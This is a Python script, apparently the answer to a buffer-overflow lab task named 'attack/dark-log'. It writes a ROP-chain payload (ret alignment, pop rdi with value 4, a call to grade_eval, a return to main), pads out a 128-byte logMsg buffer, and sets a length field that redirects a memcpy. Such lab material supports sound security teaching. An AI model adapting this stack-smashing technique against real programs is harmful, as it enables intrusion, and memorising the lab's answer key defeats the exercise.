#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log
"""
import sys

payload = (
      b'\x35\x18\x40\x00\x00\x00\x00\x00'   # 0x401835  对齐用 ret
    + b'\xa3\x18\x40\x00\x00\x00\x00\x00'   # 0x4018a3  pop rdi; ret
    + b'\x04\x00\x00\x00\x00\x00\x00\x00'   # 立即数 4（栈上数据）
    + b'\x77\x16\x40\x00\x00\x00\x00\x00'   # 0x401677  grade_eval
    + b'\x35\x18\x40\x00\x00\x00\x00\x00'   # 0x401835  对齐 ret
    + b'\xf5\x17\x40\x00\x00\x00\x00\x00'   # 0x4017f5  main
    + b'\x00' * 80                         # chain 补齐到 128（expression 剩余部分）
    + b'\x00' * 128                        # logMsg 填充
    + b'\xa8\x00\x00\x00'                  # len = 168 (0xa8)，控制 memcpy 目标
)
sys.stdout.buffer.write(payload)
